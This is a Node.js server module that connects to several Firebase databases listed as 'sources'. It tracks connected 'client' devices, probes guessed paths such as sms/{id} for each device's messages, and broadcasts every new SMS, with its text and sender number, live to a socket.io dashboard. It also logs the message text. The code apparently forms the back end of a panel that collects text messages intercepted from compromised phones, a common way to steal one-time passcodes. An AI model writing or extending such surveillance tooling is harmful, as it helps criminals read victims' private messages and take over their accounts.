const mongoose = require('mongoose');
const axios = require('axios');
const Source = require('./models/Source');
const { initializeApp } = require('firebase/app');
const { getDatabase, ref, onChildAdded, onChildChanged, onValue, query, limitToLast, update, get, limitToFirst } = require('firebase/database');

// Map to store initialized Firebase apps: src.key -> app
const firebaseApps = new Map();

// Set to store active stream keys: `${sourceKey}_${deviceId}`
const activeStreams = new Set();
let ioInstance = null;

const deviceSetupQueue = [];
let isQueueProcessing = false;

async function processDeviceQueue() {
    if (isQueueProcessing) return;
    isQueueProcessing = true;
    while (deviceSetupQueue.length > 0) {
        const { src, id, db } = deviceSetupQueue.shift();
        const streamKey = `${src.key}_${id}`;
        if (!activeStreams.has(streamKey)) {
            activeStreams.add(streamKey);
            setupMessageStream(src, id, db);
        }
        // Micro-delay to completely eliminate RAM/CPU spikes on boot
        await new Promise(r => setTimeout(r, 15));
    }
    isQueueProcessing = false;
}

function initRealtime(io) {
    ioInstance = io;
    initializeRealtimeListeners();
}

async function initializeRealtimeListeners() {
    try {
        const sources = await Source.find({});
        
        for (let src of sources) {
            if (!src.base) continue;
            
            if (!firebaseApps.has(src.key)) {
                try {
                    const appConfig = { databaseURL: src.base };
                    if (src.apiKey) appConfig.apiKey = src.apiKey;
                    const app = initializeApp(appConfig, src.key);
                    firebaseApps.set(src.key, app);
                } catch (e) {
                    console.error(`[Realtime] Failed to init Firebase App for ${src.key}:`, e.message);
                    continue;
                }
            }
            
            const db = getDatabase(firebaseApps.get(src.key));
            const clientsRef = ref(db, 'clients');
            
            // Listen for NEW devices connecting
            onChildAdded(clientsRef, (snapshot) => {
                const id = snapshot.key;
                
                // Push to the queue instead of executing immediately
                deviceSetupQueue.push({ src, id, db });
                processDeviceQueue();
                
                if (ioInstance) {
                    ioInstance.emit('deviceAdded', {
                        srcKey: src.key,
                        deviceId: id,
                        data: snapshot.val()
                    });
                }
            });
            
            // Listen for EXISTING devices changing status (online/offline)
            onChildChanged(clientsRef, (snapshot) => {
                if (ioInstance) {
                    ioInstance.emit('deviceChanged', {
                        srcKey: src.key,
                        deviceId: snapshot.key,
                        data: snapshot.val()
                    });
                }
            });
        }
    } catch(e) {
        console.error('[Realtime] Init listeners error:', e);
    }
}

async function setupMessageStream(src, id, db) {
    const streamKey = `${src.key}_${id}`;

    try {
        const authS = src.apiKey ? `?auth=${src.apiKey}&` : '?';
        const paths = [`messages/${id}`, `clients/${id}/messages`, `sms/${id}`, `clients/${id}/sms`];
        let correctPath = null;
        
        // Probe for the correct path
        for (let p of paths) {
            try {
                const probe = await axios.get(`${src.base}/${p}.json${authS}shallow=true`);
                if (probe.data) { correctPath = p; break; }
            } catch(e) {}
        }
        
        if (!correctPath) {
            correctPath = src.cachedSchema ? src.cachedSchema.replace('{id}', id) : `messages/${id}`;
        } else {
            src.cachedSchema = correctPath.replace(id, '{id}');
        }
        
        const msgRef = ref(db, correctPath);
        const q = query(msgRef, limitToLast(1));
        
        let isInitial = true;
        let lastSeenMsgId = null;
        
        // Attach onValue first to clear the isInitial flag after initial data is loaded
        const unsubValue = onValue(q, (snapshot) => {
            isInitial = false;
            snapshot.forEach(child => {
                lastSeenMsgId = child.key;
            });
            unsubValue(); // We only need this to fire once
        }, (error) => {
            console.error(`[Realtime] onValue error for ${streamKey}:`, error);
        });

        onChildAdded(q, (snapshot) => {
            if (isInitial) {
                // Ignore historical data on boot
                return;
            }
            
            try {
                const msgId = snapshot.key;
                
                // Prevent duplicate emit when a newer message is deleted and an older message shifts into limitToLast(1)
                if (lastSeenMsgId !== null) {
                    const isNumeric = !isNaN(msgId) && !isNaN(lastSeenMsgId);
                    if (isNumeric) {
                        if (Number(msgId) <= Number(lastSeenMsgId)) return;
                    } else {
                        if (String(msgId) <= String(lastSeenMsgId)) return;
                    }
                }
                lastSeenMsgId = msgId;
                
                const messageObj = snapshot.val();
                
                if (messageObj && typeof messageObj === 'object') {
                    const ts = Number(messageObj.id || messageObj.timestamp || msgId) || Date.now();
                    console.log(`[Realtime] Live SMS broadcast for device ${id}:`, messageObj.message || messageObj.body || messageObj.text);
                    
                    if (ioInstance) {
                        ioInstance.emit('newMessage', {
                            srcKey: src.key,
                            deviceId: id,
                            _fbKey: msgId,
                            _fbPath: '/' + correctPath,
                            timestamp: ts,
                            id: ts,
                            type: messageObj.type || 'incoming',
                            dateTime: messageObj.dateTime || messageObj.date || new Date().toLocaleString(),
                            message: messageObj.message || messageObj.body || messageObj.text || messageObj.msg || '',
                            sender: messageObj.sender || messageObj.address || messageObj.number || 'Unknown'
                        });
                    }
                    
                    // Permanent persistence: Update lastMessageTime in Firebase so UI sorts correctly on refresh
                    const serverTs = Date.now();
                    update(ref(db, `clients/${id}`), { lastMessageTime: serverTs }).catch(err => {
                        console.error(`[Realtime] Failed to update lastMessageTime for ${id}:`, err.message);
                    });
                }
            } catch (err) {
                console.error(`[Realtime] Parse error for ${streamKey}:`, err);
            }
        }, (error) => {
            console.error(`[Realtime] onChildAdded error for ${streamKey}:`, error);
        });
        
    } catch (e) {
        console.error(`[Realtime] Setup error for ${streamKey}:`, e);
        activeStreams.delete(streamKey); // Allow retry
    }
}

module.exports = { init: initRealtime };
